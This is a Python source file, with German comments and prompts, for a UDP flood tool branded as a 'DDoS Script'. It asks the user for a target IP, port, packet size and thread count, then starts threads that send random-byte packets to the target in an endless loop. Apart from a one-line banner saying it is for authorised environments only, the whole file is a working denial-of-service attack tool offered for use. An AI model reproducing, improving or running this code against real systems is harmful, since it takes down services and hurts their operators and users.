import socket
import threading
import random
from colorama import Fore, Style, init

# Initialisiert Colorama für Farben
init(autoreset=True)

def ddos_attack(target_ip, target_port, packet_size):
    """
    Funktion zur Durchführung eines DDoS-Angriffs
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(packet_size)
        while True:
            sock.sendto(payload, (target_ip, target_port))
            print(f"{Fore.GREEN}[+] Packet sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"{Fore.RED}[-] Fehler bei Angriff: {e}")

def main_menu():
    """
    Hauptmenü mit Branding und farbiger Darstellung
    """
    print(Fore.CYAN + """
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██████╔╝██████╔╝██║   ██║███████╗
    ██╔═══╝ ██╔═══╝ ██║   ██║╚════██║
    ██║     ██║     ╚██████╔╝███████║
    ╚═╝     ╚═╝      ╚═════╝ ╚══════╝
        Power by Chill-Zone.xyz
    """ + Style.RESET_ALL)

    print(f"{Fore.YELLOW}Willkommen im DDoS Script!")
    print(f"{Fore.LIGHTBLUE_EX}Bitte benutzen Sie dieses Tool nur in autorisierten Umgebungen!\n")

def main():
    """
    Hauptprogramm mit erweitertem Menü
    """
    main_menu()

    # Ziel-Informationen abfragen
    print(Fore.LIGHTCYAN_EX + "Bitte geben Sie die Zielinformationen ein:")
    target_ip = input(Fore.GREEN + "Ziel-IP-Adresse: ")
    target_port = int(input(Fore.GREEN + "Ziel-Port (z.B. 80): "))
    packet_size = int(input(Fore.GREEN + "Paketgröße in Bytes (z.B. 1024): "))
    thread_count = int(input(Fore.GREEN + "Anzahl der Threads: "))

    print(Fore.LIGHTMAGENTA_EX + "\n[!] Angriff wird vorbereitet...\n")
    for i in range(thread_count):
        thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, packet_size))
        thread.daemon = True
        thread.start()
        print(Fore.LIGHTYELLOW_EX + f"[+] Thread-{i+1} gestartet")

    print(Fore.RED + "\n[!] Angriff läuft. Drücken Sie STRG+C, um zu beenden.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\n[-] Angriff beendet. Programm geschlossen.")
